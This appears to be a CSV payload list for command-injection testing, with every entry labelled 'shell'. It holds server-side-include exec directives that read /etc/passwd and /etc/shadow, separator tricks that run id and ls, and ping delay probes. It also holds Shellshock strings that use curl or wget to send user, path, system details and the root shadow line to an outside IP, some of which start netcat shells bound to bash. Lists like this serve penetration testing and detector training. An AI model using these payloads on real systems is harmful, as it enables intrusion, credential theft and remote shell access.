Payloads,Types
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,shell
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,shell
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,shell
/index.html|id|,shell
;id;,shell
;id,shell
;netstat -a;,shell
;system('cat%20/etc/passwd'),shell
|id,shell
|/usr/bin/id,shell
|id|,shell
|/usr/bin/id|,shell
||/usr/bin/id|,shell
|id;,shell
||/usr/bin/id;,shell
;id|,shell
;|/usr/bin/id|,shell
\n/bin/ls -al\n,shell
\n/usr/bin/id\n,shell
\nid\n,shell
\n/usr/bin/id;,shell
\nid;,shell
\n/usr/bin/id|,shell
\nid|,shell
;/usr/bin/id\n,shell
;id\n,shell
|usr/bin/id\n,shell
|nid\n,shell
`id`,shell
`/usr/bin/id`,shell
a);id,shell
a;id,shell
a);id;,shell
a;id;,shell
a);id|,shell
a;id|,shell
a)|id,shell
a|id,shell
a)|id;,shell
|/bin/ls -al,shell
a);/usr/bin/id,shell
a;/usr/bin/id,shell
a);/usr/bin/id;,shell
a;/usr/bin/id;,shell
a);/usr/bin/id|,shell
a;/usr/bin/id|,shell
a)|/usr/bin/id,shell
a|/usr/bin/id,shell
a)|/usr/bin/id;,shell
;system('id'),shell
;system('/usr/bin/id'),shell
%0Acat%20/etc/passwd,shell
%0A/usr/bin/id,shell
%0Aid,shell
%0A/usr/bin/id%0A,shell
%0Aid%0A,shell
& ping -i 30 127.0.0.1 &,shell
& ping -n 30 127.0.0.1 &,shell
%0a ping -i 30 127.0.0.1 %0a,shell
`ping 127.0.0.1`,shell
| id,shell
& id,shell
; id,shell
%0a id %0a,shell
$;/usr/bin/id,shell
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`""",shell
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`""",shell
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`""",shell
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`""",shell
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`""",shell
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`""",shell
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=5""",shell
"() { :;}; /bin/bash -c ""sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6""",shell
"() { :;}; /bin/bash -c ""sleep 1 && echo vulnerable 1""",shell
"() { :;}; /bin/bash -c ""sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7""",shell
"() { :;}; /bin/bash -c ""sleep 3 && echo vulnerable 3""",shell
"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8""",shell
"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9""",shell
"() { :;}; /bin/bash -c ""sleep 6 && echo vulnerable 6""",shell
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`""",shell
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`""",shell
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`""",shell
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`""",shell
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`""",shell
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`""",shell
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=4""",shell
cat /etc/hosts,shell
$(`cat /etc/passwd`),shell
cat /etc/passwd,shell
"{{ get_user_file(""/etc/passwd"") }}",shell
"<!--#exec cmd=""/bin/cat /etc/passwd""-->",shell
"<!--#exec cmd=""/bin/cat /etc/shadow""-->",shell
"<!--#exec cmd=""/usr/bin/id;-->",shell
system('cat /etc/passwd');,shell
